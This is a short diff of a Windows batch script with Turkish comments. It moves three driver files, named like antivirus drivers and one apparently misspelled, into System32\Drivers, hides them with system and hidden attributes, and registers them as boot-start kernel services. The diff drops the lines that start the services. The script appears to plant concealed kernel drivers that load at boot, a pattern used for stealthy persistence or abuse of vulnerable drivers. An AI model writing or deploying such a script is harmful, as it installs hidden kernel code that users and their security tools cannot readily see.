@@ -2,26 +2,23 @@
 
 set "system32Dir=C:\Windows\System32\Drivers"
 
-:: Belirtilen sürücü dosyalarını oluştur ve başlat
+:: Belirtilen sürücü dosyalarını taşı ve servis oluştur (başlatma yok)
 if exist "%~dp0awsSnx64.sys" (
     move /y "%~dp0awsSnx64.sys" "%system32Dir%"
     attrib +s +h "%system32Dir%\awsSnx64.sys"
     sc create awsSnx64 type= kernel start= boot binpath= "%system32Dir%\awsSnx64.sys"
-    sc start awsSnx64
 )
 
 if exist "%~dp0aswbidsdriver64.sys" (
     move /y "%~dp0aswbidsdriver64.sys" "%system32Dir%"
     attrib +s +h "%system32Dir%\aswbidsdriver64.sys"
     sc create aswbidsdriver64 type= kernel start= boot binpath= "%system32Dir%\aswbidsdriver64.sys"
-    sc start aswbidsdriver64
 )
 
 if exist "%~dp0aswArDisk64.sys" (
     move /y "%~dp0aswArDisk64.sys" "%system32Dir%"
     attrib +s +h "%system32Dir%\aswArDisk64.sys"
     sc create aswArDisk64 type= kernel start= boot binpath= "%system32Dir%\aswArDisk64.sys"
-    sc start aswArDisk64
 )
 
 :: Diğer sürücü dosyalarını sadece taşı
